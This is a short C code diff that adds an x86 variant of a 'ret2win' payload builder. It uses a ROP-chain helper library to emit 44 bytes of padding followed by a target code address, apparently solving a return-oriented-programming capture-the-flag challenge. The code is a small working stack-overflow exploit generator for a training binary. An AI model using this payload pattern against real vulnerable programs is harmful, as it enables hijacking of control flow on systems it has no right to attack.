@@ -23,6 +23,20 @@ ARCH_CALL(armv5, ret2win)(void)
 }
 
 void
+ARCH_CALL(x86, ret2win)(void)
+{
+	rop_opt_set(RD_INIT | RD_WORD_32);
+	rop_begin();
+		rop_padding(44);
+		rop_name("padding (44 bytes)");
+		rop_addr(ADDR_CODE);
+		rop_name("ret2win address");
+	rop_end();
+	rop_dump();
+	rop_destroy();
+}
+
+void
 ARCH_CALL(armv5, split)(void)
 {
 	rop_opt_set(RD_INIT | RD_WORD_32);
@@ -61,7 +75,8 @@ rop_stack(void)
 
 int main(void)
 {
-	armv5_ret2win();
+//	armv5_ret2win();
+	x86_ret2win();
 //	armv5_split();
 }
 
